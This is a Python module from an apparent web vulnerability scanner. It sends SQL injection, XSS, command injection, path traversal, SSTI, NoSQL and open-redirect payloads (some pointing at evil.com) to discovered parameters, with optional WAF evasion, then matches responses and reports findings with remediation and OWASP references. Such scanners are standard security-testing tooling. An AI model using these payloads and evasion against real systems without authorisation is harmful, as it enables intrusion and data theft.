#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import re
import time
import json
import logging
from typing import Dict, Any, List, Optional, Set, Tuple, Union
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, unquote
from dataclasses import dataclass, field

from modules.base import BaseModule
from core.state import Finding, ScanState
from core.waf_evader import SmartWAFEvader
from core.injection_discovery import InjectionPoint, ParamType

logger = logging.getLogger(__name__)


@dataclass
class VulnerabilityTest:

    name: str
    category: str
    payloads: List[str]
    indicators: List[str]
    severity: str
    confidence: float = 0.8
    cwe_id: str = ""
    cvss_score: float = 5.0


@dataclass
class TestResult:

    vulnerable: bool
    evidence: List[str]
    confidence: float
    response_time: float = 0.0
    payload_used: str = ""
    error: Optional[str] = None


class VulnerabilityModule(BaseModule):

    MODULE_NAME = "vulnerability"
    MODULE_DESCRIPTION = "Advanced vulnerability detection with smart injection points"
    
    # SQL Injection payloads 
    SQLI_PAYLOADS = {
        'error_based': [
            "'", '"', '`', '\\', 
            "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
            "' OR 1=1", "' OR 1=1 --", "' OR 1=1 #",
            "1' AND 1=1 --", "1' AND 1=2 --",
            "') OR ('1'='1", "') OR '1'='1",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' AND 1=CONVERT(int, (SELECT @@version)) --",
        ],
        'time_based': [
            "' AND SLEEP(5) --",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "'; WAITFOR DELAY '0:0:5' --",
            "' AND pg_sleep(5)--",
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5) --",
        ],
        'union_based': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 'test', 'test2'--",
        ],
    }
    
    # XSS payloads 
    XSS_PAYLOADS = {
        'reflected': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
        ],
        'html_context': [
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
        ],
        'attribute_context': [
            "' onmouseover=alert('XSS') '",
            "\" onfocus=alert('XSS') autofocus \"",
            "` onerror=alert('XSS') ",
        ],
        'javascript_context': [
            "';alert('XSS');//",
            "'-alert('XSS')-'",
            "\\';alert('XSS');//",
        ],
    }
    
    # Command Injection payloads
    RCE_PAYLOADS = [
        "; id", "; whoami", "; cat /etc/passwd",
        "| id", "| whoami", "| cat /etc/passwd",
        "`id`", "`whoami`", "$(id)", "$(whoami)",
        "; echo 'RCE_TEST'", "&& echo 'RCE_TEST'",
        "|| echo 'RCE_TEST'", "; dir", "| dir",
        "; type C:\\Windows\\win.ini", "| type C:\\Windows\\win.ini",
    ]
    
    # LFI/Path Traversal payloads
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "../../../etc/passwd%00",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../windows/system32/drivers/etc/hosts",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input", "expect://id",
        "data://text/plain,<?php phpinfo(); ?>",
    ]
    
    # Open Redirect payloads
    REDIRECT_PAYLOADS = [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "/%09/evil.com",
        "https:evil.com",
        "//evil.com/%2f..",
        "https://target.com.evil.com",
        "https://evil.com/target.com",
    ]
    
    # SSTI payloads
    SSTI_PAYLOADS = [
        "${7*7}", "{{7*7}}", "<%= 7*7 %>",
        "${{7*7}}", "#{7*7}", "${7*7}{{7*7}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    ]
    
    # NoSQL Injection payloads
    NOSQL_PAYLOADS = [
        '{"$gt": ""}', '{"$ne": null}', '{"$exists": true}',
        '{"$where": "this.password.length > 0"}',
        '{"$regex": ".*"}', '{"$gt": ""}',
    ]
    
    SQL_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result",
        r"MySqlClient\.", r"PostgreSQL.*ERROR", r"Warning.*pg_.*",
        r"valid PostgreSQL result", r"Npgsql\.", r"Driver.*SQL.*Server",
        r"OLE DB.*SQL.*Server", r"(W|w)arning.*(mssql|sqlsrv).*",
        r"(W|w)arning.*(oci|ora)-[0-9]+", r"Microsoft.*OLE DB.*Oracle",
        r"ORA-[0-9]+", r"Oracle.*Driver", r"SQLite/JDBCDriver",
        r"SQLite.Exception", r"System.Data.SQLite.SQLiteException",
        r"sqlite3.*:", r"\[SQLITE_ERROR\]", r"unclosed quotation mark",
        r"syntax error", r"mysql_fetch_array", r"mysql_num_rows",
        r"pg_query", r"sqlite_query", r"SQLServer JDBC Driver",
    ]
    
    RCE_INDICATORS = [
        r"uid=\d+\(\w+\)", r"root:.*:0:0:", r"[a-z]+:\d+:\d+:[^:]*:[^:]*:[^:]*",
        r"Windows IP Configuration", r"Volume Serial Number",
        r"Linux\s+\w+\s+\d+\.\d+", r"bin:.*:1:1:", r"daemon:.*:2:2:",
        r"RCE_TEST", r"www-data:", r"apache:", r"nginx:",
    ]
    
    LFI_INDICATORS = [
        r"root:.*:0:0:", r"bin:.*:1:1:", r"daemon:.*:2:2:",
        r"# Copyright \(c\) 1993-", r"127\.0\.0\.1\s+localhost",
        r"<\?php", r"\[boot loader\]", r"root:x:0:0:root:",
        r"nobody:x:65534:", r"for 16-bit app support",
    ]
    
    def __init__(self, config, state, http_client, ai_analyzer=None):
        super().__init__(config, state, http_client, ai_analyzer)
        
        self.target = config.get('target')
        self.parsed_target = urlparse(self.target)
        self.base_url = f"{self.parsed_target.scheme}://{self.parsed_target.netloc}"
        
        self.mode = config.get('scan.mode', 'standard')
        self.timeout = config.get('scan.timeout', 30)
        self.max_concurrent = config.get('scan.threads', 10)
        
        self.waf_evader = SmartWAFEvader() if config.get('scan.evasion', False) else None
        
        self.tested_points: Set[str] = set() 
        self.total_tests = 0
        self.successful_tests = 0
        
        self.stats = {
            'endpoints_tested': 0,
            'params_tested': 0,
            'payloads_sent': 0,
            'vulnerabilities_found': 0,
            'tests_by_category': {},
        }
        
        logger.info(f"VulnerabilityModule initialized (mode: {self.mode})")
    
    async def run(self) -> Dict[str, Any]:

        logger.info(f"{'='*60}")
        logger.info(f"Starting vulnerability scan for {self.base_url}")
        logger.info(f"{'='*60}")
        
        injection_points = self._collect_injection_points()
        
        if not injection_points:
            logger.warning(" No injection points found to test!")
            logger.info("Trying fallback to target URL...")
            injection_points = self._create_fallback_points()
        
        logger.info(f"Prepared {len(injection_points)} injection points for testing")
        
        await self._execute_tests(injection_points)
        
        results = self._compile_results()
        
        logger.info(f"{'='*60}")
        logger.info(f"Vulnerability scan complete")
        logger.info(f"Stats: {self.stats}")
        logger.info(f"{'='*60}")
        
        return results
    
    def _collect_injection_points(self) -> List[InjectionPoint]:
    
        points = []
        
        for asset in self.state.assets:
            if asset.type in ('endpoint', 'api_endpoint'):
                asset_points = self._extract_points_from_asset(asset)
                points.extend(asset_points)
        
        for url, params in self.state.discovered_parameters.items():
            for param_name in params:
                point = InjectionPoint(
                    url=url,
                    method='GET',
                    param_name=param_name,
                    param_type=ParamType.QUERY,
                    source='state_parameters',
                    confidence=0.9
                )
                points.append(point)
        
        for endpoint in self.state.discovered_endpoints:
            parsed = urlparse(endpoint)
            if not parsed.query and endpoint not in [p.url for p in points]:

                point = InjectionPoint(
                    url=endpoint,
                    method='GET',
                    param_name='path',
                    param_type=ParamType.PATH,
                    source='endpoint_discovery',
                    confidence=0.7
                )
                points.append(point)
        
        unique_points = self._deduplicate_points(points)
        
        return unique_points
    
    def _extract_points_from_asset(self, asset) -> List[InjectionPoint]:

        points = []
        
        metadata = asset.metadata or {}
        params = metadata.get('params', [])
        methods = metadata.get('methods', ['GET'])
        param_types = metadata.get('param_types', ['query'])
        
        for param_name in params:

            param_type = ParamType.QUERY
            if 'form' in param_types:
                param_type = ParamType.FORM
            elif 'json' in param_types:
                param_type = ParamType.JSON
            
            for method in methods:
                point = InjectionPoint(
                    url=asset.value,
                    method=method,
                    param_name=param_name,
                    param_type=param_type,
                    source=f"asset:{asset.source}",
                    confidence=asset.confidence,
                    context=metadata
                )
                points.append(point)
        
        return points
    
    def _create_fallback_points(self) -> List[InjectionPoint]:

        points = []
        
        common_params = ['id', 'page', 'view', 'action', 'type', 'cat', 'user', 'search']
        
        for param in common_params:
            point = InjectionPoint(
                url=self.target,
                method='GET',
                param_name=param,
                param_type=ParamType.QUERY,
                source='fallback_common',
                confidence=0.5
            )
            points.append(point)
        
        points.append(InjectionPoint(
            url=self.target,
            method='GET',
            param_name='url_path',
            param_type=ParamType.PATH,
            source='fallback_target',
            confidence=0.6
        ))
        
        logger.info(f"Created {len(points)} fallback injection points")
        return points
    
    def _deduplicate_points(self, points: List[InjectionPoint]) -> List[InjectionPoint]:

        seen = set()
        unique = []
        
        for point in points:
            fingerprint = f"{point.method}:{point.url}:{point.param_name}:{point.param_type.value}"
            if fingerprint not in seen:
                seen.add(fingerprint)
                unique.append(point)
        
        return unique
    
    async def _execute_tests(self, points: List[InjectionPoint]):
        
        tests_to_run = self._get_tests_for_mode()
        
        logger.info(f"Running {len(tests_to_run)} test categories on {len(points)} points")
        
        semaphore = asyncio.Semaphore(self.max_concurrent)
        
        tasks = []
        
        for point in points:
            for test in tests_to_run:
                task = asyncio.create_task(
                    self._run_test_with_semaphore(semaphore, point, test)
                )
                tasks.append(task)
                
                if len(tasks) >= self.max_concurrent * 2:
                    await asyncio.gather(*tasks)
                    tasks = []
        
        if tasks:
            await asyncio.gather(*tasks)
    
    def _get_tests_for_mode(self) -> List[VulnerabilityTest]:

        tests = []
        
        tests.append(VulnerabilityTest(
            name="SQL Injection (Error-based)",
            category="sqli",
            payloads=self.SQLI_PAYLOADS['error_based'],
            indicators=self.SQL_ERROR_PATTERNS,
            severity="critical",
            confidence=0.9,
            cwe_id="CWE-89",
            cvss_score=9.8
        ))
        
        if self.mode in ('standard', 'deep', 'ai'):
            # XSS
            tests.append(VulnerabilityTest(
                name="Cross-Site Scripting (XSS)",
                category="xss",
                payloads=self.XSS_PAYLOADS['reflected'],
                indicators=[], 
                severity="high",
                confidence=0.85,
                cwe_id="CWE-79",
                cvss_score=6.1
            ))
            
            # Open Redirect
            tests.append(VulnerabilityTest(
                name="Open Redirect",
                category="redirect",
                payloads=self.REDIRECT_PAYLOADS,
                indicators=[],  
                severity="medium",
                confidence=0.8,
                cwe_id="CWE-601",
                cvss_score=6.1
            ))
        
        if self.mode in ('deep', 'ai'):
            # Time-based SQLi
            tests.append(VulnerabilityTest(
                name="SQL Injection (Time-based)",
                category="sqli_time",
                payloads=self.SQLI_PAYLOADS['time_based'],
                indicators=[],  
                severity="critical",
                confidence=0.85,
                cwe_id="CWE-89",
                cvss_score=9.8
            ))
            
            # Command Injection
            tests.append(VulnerabilityTest(
                name="Command Injection",
                category="rce",
                payloads=self.RCE_PAYLOADS,
                indicators=self.RCE_INDICATORS,
                severity="critical",
                confidence=0.85,
                cwe_id="CWE-78",
                cvss_score=10.0
            ))
            
            # LFI
            tests.append(VulnerabilityTest(
                name="Local File Inclusion",
                category="lfi",
                payloads=self.LFI_PAYLOADS,
                indicators=self.LFI_INDICATORS,
                severity="high",
                confidence=0.8,
                cwe_id="CWE-22",
                cvss_score=7.5
            ))
            
            # SSTI
            tests.append(VulnerabilityTest(
                name="Server-Side Template Injection",
                category="ssti",
                payloads=self.SSTI_PAYLOADS,
                indicators=[r'49', r'7777777'],  
                severity="critical",
                confidence=0.75,
                cwe_id="CWE-1336",
                cvss_score=9.8
            ))
        
        return tests
    
    async def _run_test_with_semaphore(self, semaphore: asyncio.Semaphore, point: InjectionPoint, test: VulnerabilityTest):

        async with semaphore:

            test_key = f"{point.get_fingerprint()}:{test.category}"
            if test_key in self.tested_points:
                return
            self.tested_points.add(test_key)
            
            try:
                result = await self._execute_single_test(point, test)
                
                if result.vulnerable:
                    await self._create_finding(point, test, result)
                
                self.total_tests += 1
                if result.vulnerable:
                    self.successful_tests += 1
                    
            except Exception as e:
                logger.debug(f"Test failed: {e}")
    
    async def _execute_single_test(self, point: InjectionPoint, test: VulnerabilityTest) -> TestResult:

        start_time = time.time()
        
        payloads = test.payloads
        
        if self.waf_evader:
            payloads = await self._apply_evasion(payloads)
        
        if test.category == 'sqli':
            return await self._test_sqli(point, payloads, test.indicators)
        elif test.category == 'xss':
            return await self._test_xss(point, payloads)
        elif test.category == 'sqli_time':
            return await self._test_time_based_sqli(point, payloads)
        elif test.category == 'rce':
            return await self._test_rce(point, payloads, test.indicators)
        elif test.category == 'lfi':
            return await self._test_lfi(point, payloads, test.indicators)
        elif test.category == 'redirect':
            return await self._test_redirect(point, payloads)
        elif test.category == 'ssti':
            return await self._test_ssti(point, payloads, test.indicators)
        
        return TestResult(vulnerable=False, evidence=[], confidence=0.0)
    
    
    async def _test_sqli(self, point: InjectionPoint, payloads: List[str], indicators: List[str]) -> TestResult:

        for payload in payloads:
            try:
                test_url = point.get_test_url(payload)
                
                response = await self.http_client.get(
                    test_url, 
                    timeout=self.timeout,
                    allow_redirects=False
                )
                
                self.state.increment_requests(success=True)
                self.state.increment_payloads()
                self.stats['payloads_sent'] += 1
                
                content = await response.text()
                
                for pattern in indicators:
                    if re.search(pattern, content, re.IGNORECASE):
                        return TestResult(
                            vulnerable=True,
                            evidence=[
                                f"Parameter: {point.param_name}",
                                f"Payload: {payload[:50]}...",
                                f"Error pattern: {pattern}",
                                f"Status: {response.status}"
                            ],
                            confidence=0.95,
                            payload_used=payload
                        )
                        
            except Exception as e:
                logger.debug(f"SQLi test failed: {e}")
                self.state.increment_requests(success=False)
        
        return TestResult(vulnerable=False, evidence=[], confidence=0.0)
    
    async def _test_xss(self, point: InjectionPoint, payloads: List[str]) -> TestResult:

        for payload in payloads:
            try:
                test_url = point.get_test_url(payload)
                
                response = await self.http_client.get(
                    test_url,
                    timeout=self.timeout
                )
                
                self.state.increment_requests(success=True)
                self.state.increment_payloads()
                self.stats['payloads_sent'] += 1
                
                content = await response.text()
                
                if payload in content:

                    import html
                    encoded = html.escape(payload)
                    
                    if payload not in encoded:
                        return TestResult(
                            vulnerable=True,
                            evidence=[
                                f"Parameter: {point.param_name}",
                                f"Payload reflected without encoding",
                                f"Payload: {payload[:50]}..."
                            ],
                            confidence=0.9,
                            payload_used=payload
                        )
                        
            except Exception as e:
                logger.debug(f"XSS test failed: {e}")
                self.state.increment_requests(success=False)
        
        return TestResult(vulnerable=False, evidence=[], confidence=0.0)
    
    async def _test_time_based_sqli(self, point: InjectionPoint, payloads: List[str]) -> TestResult:

        import time
        
        for payload in payloads:
            try:
                test_url = point.get_test_url(payload)
                
                start = time.time()
                response = await self.http_client.get(
                    test_url,
                    timeout=self.timeout + 10  
                )
                elapsed = time.time() - start
                
                self.state.increment_requests(success=True)
                self.state.increment_payloads()
                self.stats['payloads_sent'] += 1
                
                if elapsed >= 4.0:  
                    return TestResult(
                        vulnerable=True,
                        evidence=[
                            f"Parameter: {point.param_name}",
                            f"Time delay detected: {elapsed:.2f}s",
                            f"Payload: {payload[:50]}..."
                        ],
                        confidence=0.85,
                        response_time=elapsed,
                        payload_used=payload
                    )
                    
            except asyncio.TimeoutError:

                return TestResult(
                    vulnerable=True,
                    evidence=[
                        f"Parameter: {point.param_name}",
                        f"Request timeout (possible time-based SQLi)",
                        f"Payload: {payload[:50]}..."
                    ],
                    confidence=0.7,
                    payload_used=payload
                )
            except Exception as e:
                logger.debug(f"Time-based SQLi test failed: {e}")
                self.state.increment_requests(success=False)
        
        return TestResult(vulnerable=False, evidence=[], confidence=0.0)
    
    async def _test_rce(self, point: InjectionPoint, payloads: List[str], indicators: List[str]) -> TestResult:

        for payload in payloads:
            try:
                test_url = point.get_test_url(payload)
                
                response = await self.http_client.get(
                    test_url,
                    timeout=self.timeout
                )
                
                self.state.increment_requests(success=True)
                self.state.increment_payloads()
                self.stats['payloads_sent'] += 1
                
                content = await response.text()
                
                for pattern in indicators:
                    if re.search(pattern, content):
                        return TestResult(
                            vulnerable=True,
                            evidence=[
                                f"Parameter: {point.param_name}",
                                f"Command output detected: {pattern}",
                                f"Payload: {payload[:50]}..."
                            ],
                            confidence=0.9,
                            payload_used=payload
                        )
                        
            except Exception as e:
                logger.debug(f"RCE test failed: {e}")
                self.state.increment_requests(success=False)
        
        return TestResult(vulnerable=False, evidence=[], confidence=0.0)
    
    async def _test_lfi(self, point: InjectionPoint, payloads: List[str], indicators: List[str]) -> TestResult:

        for payload in payloads:
            try:
                test_url = point.get_test_url(payload)
                
                response = await self.http_client.get(
                    test_url,
                    timeout=self.timeout
                )
                
                self.state.increment_requests(success=True)
                self.state.increment_payloads()
                self.stats['payloads_sent'] += 1
                
                content = await response.text()
                
                for pattern in indicators:
                    if re.search(pattern, content, re.IGNORECASE):
                        return TestResult(
                            vulnerable=True,
                            evidence=[
                                f"Parameter: {point.param_name}",
                                f"File content detected: {pattern}",
                                f"Payload: {payload[:50]}..."
                            ],
                            confidence=0.9,
                            payload_used=payload
                        )
                        
            except Exception as e:
                logger.debug(f"LFI test failed: {e}")
                self.state.increment_requests(success=False)
        
        return TestResult(vulnerable=False, evidence=[], confidence=0.0)
    
    async def _test_redirect(self, point: InjectionPoint, payloads: List[str]) -> TestResult:

        for payload in payloads:
            try:
                test_url = point.get_test_url(payload)
                
                response = await self.http_client.get(
                    test_url,
                    timeout=self.timeout,
                    allow_redirects=False  
                )
                
                self.state.increment_requests(success=True)
                self.state.increment_payloads()
                self.stats['payloads_sent'] += 1
                
                if response.status in (301, 302, 303, 307, 308):
                    location = response.headers.get('Location', '')
                    
                    if 'evil.com' in location or payload in location:
                        return TestResult(
                            vulnerable=True,
                            evidence=[
                                f"Parameter: {point.param_name}",
                                f"Redirect to: {location}",
                                f"Status: {response.status}"
                            ],
                            confidence=0.95,
                            payload_used=payload
                        )
                        
            except Exception as e:
                logger.debug(f"Redirect test failed: {e}")
                self.state.increment_requests(success=False)
        
        return TestResult(vulnerable=False, evidence=[], confidence=0.0)
    
    async def _test_ssti(self, point: InjectionPoint, payloads: List[str], indicators: List[str]) -> TestResult:

        for payload in payloads:
            try:
                test_url = point.get_test_url(payload)
                
                response = await self.http_client.get(
                    test_url,
                    timeout=self.timeout
                )
                
                self.state.increment_requests(success=True)
                self.state.increment_payloads()
                self.stats['payloads_sent'] += 1
                
                content = await response.text()
                
                for indicator in indicators:
                    if indicator in content:
                        return TestResult(
                            vulnerable=True,
                            evidence=[
                                f"Parameter: {point.param_name}",
                                f"Template evaluation detected: {indicator}",
                                f"Payload: {payload[:50]}..."
                            ],
                            confidence=0.85,
                            payload_used=payload
                        )
                        
            except Exception as e:
                logger.debug(f"SSTI test failed: {e}")
                self.state.increment_requests(success=False)
        
        return TestResult(vulnerable=False, evidence=[], confidence=0.0)

    async def _apply_evasion(self, payloads: List[str]) -> List[str]:

        if not self.waf_evader:
            return payloads
        
        evaded = []
        for payload in payloads[:5]: 
            try:
                variants = await self.waf_evader.evade_payload(payload, None)
                evaded.extend(variants[:2])  
            except:
                evaded.append(payload)
        
        return evaded[:10]  
    
    async def _create_finding(self, point: InjectionPoint, test: VulnerabilityTest, result: TestResult):

        finding = Finding(
            id=f"{test.category.upper()}_{int(time.time())}_{self.stats['vulnerabilities_found']}",
            title=f"{test.name} in {point.param_name}",
            description=f"The parameter '{point.param_name}' at {point.url} is vulnerable to {test.name}.",
            severity=test.severity,
            category=test.category,
            url=point.url,
            evidence=result.evidence,
            remediation=self._get_remediation(test.category),
            references=self._get_references(test.category),
            cvss_score=test.cvss_score,
            cwe_id=test.cwe_id,
            confidence=result.confidence,
            verified=True,
            metadata={
                'param_name': point.param_name,
                'param_type': point.param_type.value,
                'payload_used': result.payload_used,
                'response_time': result.response_time,
                'test_method': test.name
            }
        )
        
        self.state.add_finding(finding)
        self.add_finding(finding.to_dict())
        
        self.stats['vulnerabilities_found'] += 1
        self.stats['tests_by_category'][test.category] = \
            self.stats['tests_by_category'].get(test.category, 0) + 1
        
        logger.warning(f"ðŸš¨ VULNERABILITY FOUND: [{test.severity.upper()}] {finding.title}")
    
    def _get_remediation(self, category: str) -> str:

        remediations = {
            'sqli': 'Use parameterized queries or prepared statements. Never concatenate user input into SQL queries.',
            'sqli_time': 'Use parameterized queries. Implement proper input validation and sanitization.',
            'xss': 'Encode all output based on context. Implement Content Security Policy (CSP).',
            'rce': 'Never pass user input to system commands. Use allowlists and input validation.',
            'lfi': 'Use allowlists for file inclusion. Never include files based on user input.',
            'redirect': 'Validate redirect URLs against allowlist. Use relative URLs only.',
            'ssti': 'Use logic-less templates. Never execute user input in template engines.',
        }
        return remediations.get(category, 'Review and validate all user input.')
    
    def _get_references(self, category: str) -> List[str]:

        references = {
            'sqli': ['https://owasp.org/www-community/attacks/SQL_Injection'],
            'xss': ['https://owasp.org/www-community/attacks/xss/'],
            'rce': ['https://owasp.org/www-community/attacks/Command_Injection'],
            'lfi': ['https://owasp.org/www-community/attacks/Path_Traversal'],
            'redirect': ['https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html'],
            'ssti': ['https://owasp.org/www-community/vulnerabilities/Server-Side_Template_Injection'],
        }
        return references.get(category, [])
    
    def _compile_results(self) -> Dict[str, Any]:

        return {
            'assets': self.assets,
            'findings': self.findings,
            'stats': {
                **self.stats,
                'total_tests': self.total_tests,
                'successful_tests': self.successful_tests,
                'test_success_rate': (self.successful_tests / max(self.total_tests, 1)) * 100,
            }
        }
